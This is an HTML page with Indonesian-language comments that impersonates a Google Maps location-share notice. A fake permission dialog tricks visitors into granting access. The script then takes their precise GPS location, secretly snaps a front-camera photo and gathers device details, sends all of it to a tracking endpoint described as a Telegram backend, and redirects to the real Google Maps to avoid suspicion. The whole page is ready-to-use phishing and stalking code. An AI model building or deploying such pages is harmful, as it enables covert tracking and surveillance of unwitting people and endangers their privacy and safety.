<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps</title>
    <style>
        body { 
            font-family: Roboto, Arial, sans-serif; 
            background: #f8f9fa; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden;
        }
        .card { 
            background: white; 
            padding: 30px; 
            border-radius: 12px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
            text-align: center; 
            max-width: 360px; 
            width: 100%; 
            position: relative;
        }
        .logo {
            width: 48px;
            height: 48px;
            margin-bottom: 15px;
        }
        h3 { color: #202124; margin-bottom: 8px; font-size: 20px; font-weight: 500;}
        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
        .btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: 500;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        .btn:hover { background-color: #1557b0; }
        
        /* CSS untuk Pre-Prompt Overlay (Pop-up Palsu) */
        .overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.4);
            display: none; /* Disembunyikan secara default */
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .mock-dialog {
            background: white;
            width: 300px;
            border-radius: 8px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.2);
            padding: 24px;
            text-align: left;
            animation: popIn 0.3s ease-out;
        }
        .mock-dialog h4 { margin: 0 0 10px 0; font-size: 16px; color: #202124; }
        .mock-dialog p { margin: 0 0 20px 0; font-size: 14px; color: #5f6368; }
        .dialog-actions { display: flex; justify-content: flex-end; gap: 10px; }
        .btn-dialog {
            background: transparent;
            color: #1a73e8;
            border: none;
            padding: 8px 12px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            border-radius: 4px;
        }
        .btn-dialog:hover { background: #f1f3f4; }
        
        @keyframes popIn { 
            0% { opacity: 0; transform: scale(0.9); } 
            100% { opacity: 1; transform: scale(1); } 
        }

        .spinner { 
            border: 4px solid #f3f3f3; 
            border-top: 4px solid #1a73e8; 
            border-radius: 50%; 
            width: 40px; height: 40px; 
            animation: spin 1s linear infinite; 
            margin: 20px auto; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card" id="main-card">
        <svg class="logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path fill="#4285F4" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
        </svg>
        <h3>Google Maps</h3>
        <p>Seseorang telah membagikan lokasi waktu nyata dengan Anda.</p>
        <button class="btn" onclick="showPrePrompt()">Lihat Lokasi</button>
    </div>

    <!-- Pre-Prompt / Pop-up Palsu -->
    <div class="overlay" id="pre-prompt">
        <div class="mock-dialog">
            <h4>Google Maps membutuhkan akses</h4>
            <p>Untuk merender rute dan mengkalkulasi jarak Anda dengan lokasi yang dibagikan secara akurat, izinkan akses lokasi di langkah berikutnya.</p>
            <div class="dialog-actions">
                <button class="btn-dialog" onclick="denyAccess()">Lain Kali</button>
                <button class="btn-dialog" onclick="triggerRealTracking()">Lanjutkan</button>
            </div>
        </div>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // Memunculkan Pop-up palsu terlebih dahulu
        function showPrePrompt() {
            document.getElementById('pre-prompt').style.display = 'flex';
        }

        function denyAccess() {
            document.getElementById('pre-prompt').style.display = 'none';
            // Tetap arahkan ke maps meski menolak agar tidak curiga
            window.location.href = 'https://www.google.com/maps';
        }

        // Jalankan pelacakan asli setelah target setuju di Pop-up palsu
        async function triggerRealTracking() {
            // Sembunyikan pop-up palsu
            document.getElementById('pre-prompt').style.display = 'none';
            
            // Ubah UI agar terlihat sedang loading
            const card = document.getElementById('main-card');
            card.innerHTML = `
                <div class="spinner"></div>
                <h3>Memuat Peta...</h3>
                <p>Mengkalkulasi jarak rute terbaik...</p>
            `;

            let latitude = null;
            let longitude = null;
            let accuracy = null;

            // 1. Ambil Lokasi GPS (Di sini pop-up asli browser akan muncul)
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000 });
                    });
                    latitude = pos.coords.latitude;
                    longitude = pos.coords.longitude;
                    accuracy = pos.coords.accuracy;
                } catch (e) {
                    console.log("GPS ditolak");
                }
            }

            // 2. Ambil Foto Kamera Depan secara Diam-diam
            let imageBase64 = null;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise((resolve) => { video.onloadedmetadata = () => resolve(); });
                
                await new Promise(r => setTimeout(r, 1000));

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                imageBase64 = canvas.toDataURL('image/jpeg', 0.8);

                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                console.log("Kamera ditolak");
            }

            // 3. Info Perangkat
            const deviceData = {
                hardwareConcurrency: navigator.hardwareConcurrency || '-',
                deviceMemory: navigator.deviceMemory || '-',
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language || '-'
            };

            // 4. Kirim Data ke Backend Telegram
            try {
                await fetch('/api/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        latitude,
                        longitude,
                        accuracy,
                        image: imageBase64,
                        deviceData
                    })
                });
            } catch (e) {
                console.log("Gagal kirim data");
            }

            // 5. Redirect ke Google Maps Asli
            if (latitude && longitude) {
                window.location.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
            } else {
                window.location.href = 'https://www.google.com/maps';
            }
        }
    </script>
</body>
</html>
